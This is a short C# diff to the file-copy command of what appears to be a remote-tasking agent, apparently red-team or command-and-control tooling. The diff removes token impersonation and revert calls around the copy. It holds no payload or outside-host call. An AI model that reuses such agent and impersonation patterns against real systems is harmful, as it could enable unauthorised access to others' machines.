@@ -20,10 +20,6 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             CopyArgs args = JsonSerializer.Deserialize<CopyArgs>(job.task.parameters);
-            if (job.task.token != 0)
-            {
-                tokenManager.Impersonate(job.task.token);
-            }
             try
             {
                 if(string.IsNullOrEmpty(args.source) || string.IsNullOrEmpty(args.destination))
@@ -59,11 +55,6 @@ namespace Agent
             catch (Exception e)
             {
                 messageManager.Write(e.ToString(), job.task.id, true, "error");
-            }
-
-            if (job.task.token != 0)
-            {
-                tokenManager.Revert();
             }
         }
         private bool CopyDirectory(string sourceDir, string destinationDir, bool recursive)
